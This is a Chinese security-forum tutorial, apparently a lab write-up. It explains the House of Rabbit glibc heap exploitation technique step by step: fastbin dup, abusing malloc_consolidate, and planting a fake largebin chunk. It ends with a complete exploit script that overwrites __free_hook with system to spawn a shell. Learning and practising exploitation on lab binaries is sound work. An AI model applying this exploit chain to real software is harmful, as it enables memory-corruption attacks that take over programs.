> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1559890-1-1.html)

> [md]## House of Rabbit 这种利用方式产生于 2017 年，本质的原理是可以通过修改 fastbin 的 `size` 或是 fd，触发 `malloc_consolidate`，使得 fastbin 被......

 ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg) 呆毛王与咖喱棒 _ 本帖最后由 呆毛王与咖喱棒 于 2021-12-11 20:26 编辑_  

House of Rabbit
---------------

这种利用方式产生于 2017 年，本质的原理是可以通过修改 fastbin 的`size`或是 fd，触发`malloc_consolidate`，使得 fastbin 被 link 到其他的 bins 中

首先检查程序的安全机制

![](https://static.hack1s.fun/images/2021/12/10/image-20211210183459459.png)

除了 PIE 随机化其他的都是全开

程序的菜单有一个限制

![](https://static.hack1s.fun/images/2021/12/10/image-20211210183619003.png)

总的申请 chunk 数量为 9 个，其中只能包含 4 次 fastbin

对大小倒是没有限制，从 fastbin 到 largebin 都可以申请；

另外程序最开始有一个 libc 的 leak，并且最初输入的 age 是可以通过菜单修改的；

程序 free 时没有清除 meta data，导致存在 double free 的漏洞

和之前的几个实例相比，还有一个特点

![](https://static.hack1s.fun/images/2021/12/10/image-20211210184557962.png)

之前的程序 user 字段会在 target 的上面，这样我们可以将 user 字段伪造成一个 chunk 的 size 字段，进而申请空间后修改 target

但是这个程序 target 是在 user 的上面的，这种方法就行不通了

在 [house of force](https://hack1s.fun/2021/03/08/heaplab-house_of_force/) 中，也有类似的情况，我们的解决方法是将 Top Chunk 溢出修改为一个特别大的值，之后申请内存时循环一圈申请到上方的空间

那么在这个程序中是否也可以使用类似的方法呢？

### 任意地址写

如果要利用这个 user 伪造 chunk 的 size，使用类似 house of force 的方法申请很大的空间，那么只能设法将一个 largebin link 到这个 user 字段这里了。

在 [house of lore](https://hack1s.fun/2021/11/25/heaplab-house-of-lore/) 中介绍过将伪造的 chunk 加入到 largebin 的方法

当时是存在溢出的漏洞可以修改一个 largebin 的 fd、bk 字段，但是这个程序中也无法实现这样的效果

首先利用 fastbin dup 得到一个 overlap 的指针

```
fast_A = malloc(0x18, "A"*8)
fast_B = malloc(0x18, "B"*8)

free(fast_A)
free(fast_B)
free(fast_A)

malloc(0x18, p64(elf.sym.usr))

```

但是这个程序只能申请 4 次 fastbin，我们这就已经用了三次了

肯定是没办法直接用 fastbin dup 了，而且 fastbin 的大小对我们这种情况也不适用，我们想要的是 largebin，准确的说的最大的 largebin，只有最大的 largebin 才能申请无限大的 chunk

![](https://static.hack1s.fun/images/2021/11/25/image-20211125151348290.png)

下面就是 house of rabbit 的一个核心的内容了

首先我们可以设法触发`malloc_consolidate`，在这个函数中，会将 fastbin 放入到 unsortedbin 中尝试对内存进行合并，这样可以将 fastbin 放到 unsortedbin 中

`malloc_consolidate`没办法直接调用，只能间接设法触发

![](https://static.hack1s.fun/images/2021/12/10/image-20211210202738385.png)

在 malloc 的执行流程中，有两个地方用到了`malloc_consolidate`

可以看到上面的一次调用，只要 malloc 接收到 largebin 大小的申请就会触发

这个思想也很合理，当申请一个特别大的 chunk 时，会先将内存中细碎的小空间释放或合并，否则可能由于空间不连续多占用很多空间

那么修改一下 exploit

```
fast_A = malloc(0x18, "A"*8)
fast_B = malloc(0x18, "B"*8)

free(fast_A)
free(fast_B)
free(fast_A)

malloc(0x18, p64(elf.sym.usr))
malloc(0x3f8,'a'*8)

```

这在执行时出现了报错

![](https://static.hack1s.fun/images/2021/12/10/image-20211210211038111.png)

不过好消息是这个报错是`malloc_consolidat`中触发的

也就是说我们成功触发了这个函数，出现错误的原因也很熟悉了，是 unlink 时的错误

这里 unlink 的是`nextchunk`，在 gdb 中 print 一下看看是哪一个 chunk

![](https://static.hack1s.fun/images/2021/12/10/image-20211210211748662.png)

所以这里尝试 unlink 的是我们伪造的 user 的下一个位置

为什么会这样呢？

这需要结合`malloc_consolidate`的功能来考虑

这个函数的目的是合并内存的 free 碎片

顺着 fastbin 的 fd 找到在 user 伪造的 chunk 之后

*   fake chunk 在 fastbin 上，所以是一个 free 的
*   向下找 fake chunk 之后的 chunk（即这里的 nextchunk），判断它是否也需要合并进来
*   从 nextchunk 接着往下找，看 nextchunk 后面的 nnchunk 的 prev_inuse 字段是否为 0，如果是的话就合并进来

在这里接下来的部分 size 是 0，所以 nnchunk 的 prev_inuse 也是 0

`malloc_consolidate`认为 nextchunk 也是一个 free 了的 chunk，所以需要将其 unlink 下来

* * *

要通过这个判断，有一个方法就是将 fake chunk 的 size 字段修改为 1

由于大小是 0，nextchunk 也是指向了自己，接下来由于 prev_inuse 为 1，就停止搜索了

这样运行仍然报了一个错

![](https://static.hack1s.fun/images/2021/12/10/image-20211210214159861.png)

不过已经不是之前`consolidate`的漏洞了

报错的原因是`malloc(): memory corruption`

![](https://static.hack1s.fun/images/2021/12/10/image-20211210215021355.png)

这时查看`user`结构体附近的值，可以看到 unsortedbin 的 fd、bk 已经写入到这里了

这说明我们已经通过`malloc_consolidate`将伪造的 chunk 从 fastbin link 到了 unsortedbin 中

接下来处理这里的报错

![](https://static.hack1s.fun/images/2021/12/11/image-20211211153222168.png)

报错出现的原因是在检验 fake chunk 的 size 时小于`2*SIZE_SZ`，不是一个有效的 unsortedbin 的 size

上面 malloc 的流程图中可以看到在触发了`malloc_consolidate`之后紧接着做的事情就是 scan unsortedbin，判断 unsortedbin 中是否有符合条件可以满足申请的 chunk

要想解决这个问题有两个方法：

一是在这里申请 large chunk 之前更早的时候首先在 unsortedbin 中放一个可以满足要求的 chunk，这样第一次扫描 unsortedbin 的时候就不会检查到 fake chunk 的 size

二是直接放弃这个`malloc_consolidate`，转而尝试触发其他途径上的`malloc_consolidate`

#### 思路一

修改 exploit

```
large = malloc(0x3f8, "large")
avoid = malloc(0x98, 'small')

fast_A = malloc(0x18, "A"*8)
fast_B = malloc(0x18, "B"*8)

free(large)
free(fast_A)
free(fast_B)
free(fast_A)

malloc(0x18, p64(elf.sym.usr))
malloc(0x3f8,'a'*8)

```

在最上面增加一个 large 一个 avoid

首先 large 的申请就是为了首先在 unsortedbin 中增加一个大小和我们要申请的内容相同的 chunk

avoid 则是为了防止与 top chunk 合并设置的

如果不增加 avoid 的话，large、fast_A、fast_B 全部都会和 top chunk 合并，就无法留在 unsortedbin 中了

另外 avoid 还有一个作用是防止 large 和 fast_A、fast_B 合并

如果将 avoid 的位置放在 fast_B 的下面，这样在执行完毕`malloc_consolidate`之后，几个 chunk 都不会和 top chunk 合并，但是 large 和 fast_A、fast_B 会合并为一个 chunk

![](https://static.hack1s.fun/images/2021/12/11/image-20211211164524083.png)

这导致 unsortedbin 中的大小发生了改变，unsortedbin 的搜索停止条件是有一个 chunk 的大小完全相同，这样的话就无法阻止 unsortedbin 继续搜索我们的 fake chunk

不过也可以通过修改最后一个 malloc 的大小解决，从 0x3f8 改为 0x438 即可

```
malloc(0x438,'a'*8)

```

#### 思路二

其实`malloc_consolidate`除了在申请时可能触发，还可能在释放时触发

![](https://static.hack1s.fun/images/2021/12/11/image-20211211165327694.png)

在 free 时如果一个 chunk 的大小大于了`fastbin consolidation threshold`这个值

就会触发`malloc_consolidate`，这个值默认是 65535

可以看到在到达这里之前，free 函数首先会尝试与前后的 chunk 进行合并，合并之后才会判断是否需要 consolidate fastbin

那么只要在堆靠近 top chunk 的地方 free 掉一个 unsortedbin，unsortedbin 与 top chunk 进行合并，之后发现 top chunk 的值大于了 65535，之后就会触发`malloc_consolidate`

```
fast_A = malloc(0x18, "A"*8)
fast_B = malloc(0x18, "B"*8)

free(fast_A)
free(fast_B)
free(fast_A)

malloc(0x18, p64(elf.sym.usr))
unsorted = malloc(0x88,'a'*8)
free(unsorted)

```

* * *

既然成功将 fake chunk 放入到了 unsortedbin 中，接下来要做的就是将其放入到 largebin

首先将 age 字段修改为 0x80001

之后申请一个比这个还要大的 chunk，这样就会将其从 unsortedbin 中 unlink 下来放到 largebin

```
amend_age(0x80001)
malloc(0x80008,'bbbb')

```

运行之后，仍然报了一个错误

![](https://static.hack1s.fun/images/2021/12/11/image-20211211153222168.png)

和之前错误的是一个位置，也就是检查 fake chunk 的 size 时出错

但是这次不是因为太小了，而是因为太大了导致的

```
chunksize_nomask(victim)>av->system_mem

```

这时系统的`av->system_mem`比我们申请的 chunk 可小太多了

![](https://static.hack1s.fun/images/2021/12/11/image-20211211185340567.png)

但是这里的问题是，想要将 chunk 放入到最大的 largebin，最小的值就是 0x8001 了

既然没办法修改这个值，那只能想办法让`av->system_mem`变大了

如果在之前申请一个特别大的 chunk，那么系统就会更新 system_mem

目前这个值是 0x21000，那么如果申请一个 0x60000 大小的 chunk，就可以将 system_mem 变的比 0x80001 大了

在最开始申请一个超大的 chunk

```
very_large = malloc(0x5fff8,'bbbig')

```

继续运行，发现这个 chunk 并没有在堆里，system_mem 也没有变大

![](https://static.hack1s.fun/images/2021/12/11/image-20211211190152663.png)

使用`malloc_chunk m_array[0]-0x10`可以看到

这个 chunk 的标识位`IS_MMAPED`被置为 1 了

也就是说这个 chunk 并不是通过 malloc 分配的，而是通过 mmap 分配的

在释放的时候也是直接使用 unmmap 释放

![](https://static.hack1s.fun/images/2021/12/11/image-20211211190459164.png)

这是因为申请的内存太大了，堆分配器认为程序一般不会用到这么大的内存

偶尔出现一次不如直接用`mmap`分配一个新的区域出来

实际上具体执行时比较的时`mp_.mmap_threshold`这个阈值

只要这个值不发生变化，那就没办法申请这么大的空间，所以必须想办法增大这个阈值才行

![](https://static.hack1s.fun/images/2021/12/11/image-20211211190928605.png)

改变这个阈值的情况就是当释放掉一个特别大并且有 mmaped 标识位的 chunk 时，如果它的大小大于现在的`mp_.mmap_threshold`就扩大这个阈值

所以我们改写一下 exploit，free 掉这个 mmap 的空间，并再申请一次

```
very_big = malloc(0x5fff8,'bbbig')
free(very_big)
very_big = malloc(0x5fff8,'bbbig')

fast_A = malloc(0x18, "A"*8)
fast_B = malloc(0x18, "B"*8)

free(fast_A)
free(fast_B)
free(fast_A)

malloc(0x18,p64(elf.sym.user))
large = malloc(0x88,'bbbb')
free(large)

amend_age(0x80001)
malloc(0x80008,'bbb')

```

这时再运行可以发现 gdb 没有报错了

主动暂停一下看看，可以看到`mmap_threshold`增大到了 0x61000

另外整个堆空间的大小变成了 0x81000

最后就是成功将 fake chunk 加入到了 largebin

![](https://static.hack1s.fun/images/2021/12/11/image-20211211191454847.png)

可以看到 skiplist 的 fd、bk 也已经有了值

那么最后只需要申请一个超级大的空间，让内存滚上一圈

再申请下来 target 的空间就可以了

```
very_big = malloc(0x5fff8,'bbbig')
free(very_big)
very_big = malloc(0x5fff8,'bbbig')

fast_A = malloc(0x18, "A"*8)
fast_B = malloc(0x18, "B"*8)

free(fast_A)
free(fast_B)
free(fast_A)

malloc(0x18,p64(elf.sym.user))
large = malloc(0x88,'bbbb')
free(large)

amend_age(0x80001)
malloc(0x80008,'bbbb')

amend_age(0xfffffffffffffff1)
malloc(0xffffffffffffffff-elf.sym.user+elf.sym.target-0x20, 'bbbb')
malloc(0x18, b"Much Win\x00")

```

成功改写了目标字符串

![](https://static.hack1s.fun/images/2021/12/11/image-20211211192634847.png)

### 任意代码执行

有了任意地址写的能力，代码执行就很简单了

直接针对 free_hook，将其修改为 system 的地址

上面的 exploit 进行一些修改

```
amend_age(0xfffffffffffffff1)

distance = libc.sym.__free_hook-0x20 - elf.sym.user
malloc(distance,'xxxx')

malloc(0x18, p64(libc.sym.system))

```

但是没想到在最后一个 malloc 居然出错了

出错的原因还是熟悉的 unsortedbin 大小检查时出错

![](https://static.hack1s.fun/images/2021/12/11/image-20211211194036198.png)

这个 unsortedbin 是哪里来的呢？

我们构造的 fake chunk 大小太大了，在申请一个从 free_hook 到 user 的内存之后，还有很大的剩余空间，因此需要放入到 remainder 中

所以这就导致 remainder 的 size 没有通过检查

那么对应的解决方法也很简单，只要设法让 remainder 的大小可控就可以了

```
distance = libc.sym.__free_hook-0x20 - elf.sym.user
print("distance %s" % hex(distance))

amend_age(distance+0x29)

binsh = malloc(distance,"/bin/sh\x00")
malloc(0x18, p64(0)+p64(libc.sym.system))

free(binsh)

```

重修修改一下 fake chunk 的 size

让其大小正好是从 user 到 free_hook 前面的差加上一个修改的 chunk 大小

![](https://static.hack1s.fun/images/2021/12/11/image-20211211195958221.png)

注意需要

调整一下 age 设置为 16 位对齐

最后执行就可以获得 shell 了

![](https://static.hack1s.fun/images/2021/12/11/image-20211211200225548.png)

最终完整的 exploit

```
very_big = malloc(0x5fff8,'bbbig')
free(very_big)
very_big = malloc(0x5fff8,'bbbig')

fast_A = malloc(0x18, "A"*8)
fast_B = malloc(0x18, "B"*8)

free(fast_A)
free(fast_B)
free(fast_A) 

malloc(0x18,p64(elf.sym.user))
large = malloc(0x88,'bbbb')
free(large)

amend_age(0x80001)
malloc(0x80008,'bbb')

distance = libc.sym.__free_hook-0x20 - elf.sym.user
print("distance %s" % hex(distance))

amend_age(distance+0x29)

binsh = malloc(distance,"/bin/sh\x00")
malloc(0x18, p64(0)+p64(libc.sym.system))

free(binsh)

```

![](https://static.52pojie.cn/static/image/filetype/zip.gif)

[house_of_rabbit.zip](forum.php?mod=attachment&aid=MjM1NjE4OXw4NzlkZTRmMnwxNjM5MzExNTI5fDIxMzQzMXwxNTU5ODkw)

2021-12-11 20:24 上传

点击文件名下载附件

下载积分: 吾爱币 -1 CB  

6.23 KB, 下载次数: 2, 下载积分: 吾爱币 -1 CB ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) 讲得很详细，学习了！![](https://static.52pojie.cn/static/image/smiley/default/lol.gif)![](https://avatar.52pojie.cn/images/noavatar_middle.gif)BBridgeW 又过来学习了，支持一下。![](https://avatar.52pojie.cn/images/noavatar_middle.gif)tbloy 初学 Linux，认真地阅读了文章的每段话、每个字，受益匪浅。还有很长的路要走，加油！